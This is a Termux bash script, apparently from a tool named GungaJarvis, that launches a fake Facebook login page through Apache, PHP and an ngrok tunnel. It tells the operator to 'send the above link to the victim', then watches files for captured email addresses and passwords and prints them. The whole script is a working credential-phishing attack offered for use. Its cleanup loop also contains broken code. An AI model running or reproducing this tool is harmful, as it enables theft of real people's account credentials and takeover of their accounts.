#! /data/data/com.termux/files/usr/bin/bash
apache_dir='/data/data/com.termux/files/usr/share/apache2/default-site/htdocs'

arr[0]='\nCaution: More than 50 gmails and 50 passwords are not stored, for storage purposes.\n\n'
arr[1]='\nCaution: You cannot use a single server for many victims.\n\n'
arr[2]='\nTip: You can use "short urls" to change your ngrok url.\n\n'
arr[3]='\nCaution: Dont rename your files.\n\n'
arr[4]='\nCaution: Dont move GungaJarvis to any other directory other than "home".\n\n'
arr[5]='\nCaution: If you stop the tool in between, your files are stored in apache2 dir.\n\n'
rand=$[ $RANDOM % 6 ]
echo -e "${arr[$rand]}"
sleep 2

check_files() {
cd $HOME/GungaJarvis/utils/phishing/websites/facebook/
if [[ -e gmail.txt && -e pass.txt && -e process.php && -e style.css && -e index.html && -e facebook.sh && ip.php && ip.txt ]]; then
echo '' >/dev/null 2>&1
else
cd $apache_dir
fi
if [[ -e gmail.txt && -e pass.txt && -e process.php && -e style.css && -e index.html && ip.php && ip.txt ]]; then
mv $apache_dir/* $HOME/GungaJarvis/utils/phishing/websites/facebook/
else
echo 'Sorry to say: Some files are deleted. Please reinstall GungaJarvis'
exit 1
fi
}
check_files

stop() {
echo -e 'Stopping the server'
killall ngrok
echo ''
echo -e 'Ngrok stopped...'
killall php
echo -e 'Php stopped...'
apachectl stop > /dev/null 2>&1
echo -e 'Apache2 stopped...'
}

requirements() {
command -v php > /dev/null 2>&1 || { echo >&2 "php is required which is not installed, Please install it. Exiting."; exit 1; }
command -v unzip > /dev/null 2>&1 || { echo >&2 "unzip command is required which is not installed, Please install it. Exiting."; exit 1; }
command -v wget > /dev/null 2>&1 || { echo >&2 "wget is required which is not installed, Please install it. Exiting."; exit 1; }
}
requirements

check_ngrok() {
cd $HOME/GungaJarvis/utils/phishing
if [[ -f ngrok ]]; then #1
echo ''
else #1
read -p $'Do you have your fully authenticated ngrok in your home directory [y/n]: ' check_ng
if [[ $check_ng == 'y' ]]; then #2
cd $HOME
cp ngrok $HOME/GungaJarvis/utils/phishing
else
read -p $'Do you want to download ngrok [y/n]: ' d_ngrok
if [[ $d_ngrok == 'y' ]]; then #3
arch=$(uname -a | grep -o 'arm' | head -n1)
arch2=$(uname -a | grep -o 'Android' | head -n1)
if [[ $arch == *'arm'* ]] || [[ $arch2 == *'Android'* ]] ; then #4
cd $HOME
wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip > /dev/null 2>&1
if [[ -e ngrok-stable-linux-arm.zip ]]; then #5
echo -e 'Downloaded successfully'
unzip ngrok-stable-linux-arm.zip
chmod +x ngrok
else #5
echo -e 'Error while downloading.........'
sleep 3.0
exit 1
fi #5
else #4
wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip > /dev/null 2>&1
if [[ -e ngrok-stable-linux-386.zip ]]; then #6
unzip ngrok-stable-linux-386.zip > /dev/null 2>&1
chmod +x ngrok
else #6
echo -e 'Error while downloading..........'
exit 1
fi #6
fi #4
else #3
echo ''
fi #3
fi #2
fi #1
}
check_ngrok

start_server() {
echo -e 'Starting server....'
cd $HOME/GungaJarvis/utils/phishing
./ngrok http 3333 > /dev/null 2>&1 &
sleep 5
echo -e '\nNgrok started'
cd $apache_dir
php -S 127.0.0.1:3333 >/dev/null 2>&1 &
sleep 5
echo -e '\nPhp started'
cd $HOME
apachectl >/dev/null 2>&1
echo -e '\nApache2 started'
cd $HOME/GungaJarvis/utils/phishing/websites/facebook
before_gmail=$(wc -l < gmail.txt)
before_pass=$(wc -l < pass.txt)
mv $HOME/GungaJarvis/utils/phishing/websites/facebook/* $apache_dir/
mv $apache_dir/facebook.sh $HOME/GungaJarvis/utils/phishing/websites/facebook/
link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "http://[0-9a-z]*\.ngrok.io")
echo -e '\n\n'
echo 'Ngrok link: ' $link
echo 'send the above link to the victim'
echo -e '\n\n'
}
start_server

transfer_items() {
cd $apache_dir
while true
do
after_gmail=$(wc -l < gmail.txt)
after_pass=$(wc -l < pass.txt)
if [[ $after_gmail -gt $before_gmail && $after_pass -gt $before_pass ]]; then
echo ''
echo -e 'Credentials found....'
mv $apache_dir/* $HOME/GungaJarvis/utils/phishing/websites/facebook
cd $HOME/GungaJarvis/utils/phishing/websites/facebook
mv manual $apache_dir
cd $HOME/GungaJarvis/utils/phishing/websites/facebook
echo -e '\n\n'
echo 'Gmail: ' $(cat gmail.txt | tail -1)
echo ''
echo 'Password ' $(cat pass.txt | tail -1)
echo -e '\n\n'
break
else
echo '' >/dev/null
fi
done
}
transfer_items

cleaner() {
cd $HOME/GungaJarvis/utils/phishing/websites/facebook
while true
do
gmail_cleaner=$(wc -l < gmail.txt)
echo $gmail_cleaner
until [ $gmail_cleaner -le 50 ]
do
sed -i '1d' gmail.txt
$gmail_cleaner-=1
done
pass_cleaner=$(wc -l < pass.txt)
until [ $pass_cleaner -le 50 ]
do
sed -i '1d' pass.txt
done
break
done
}
cleaner
stop
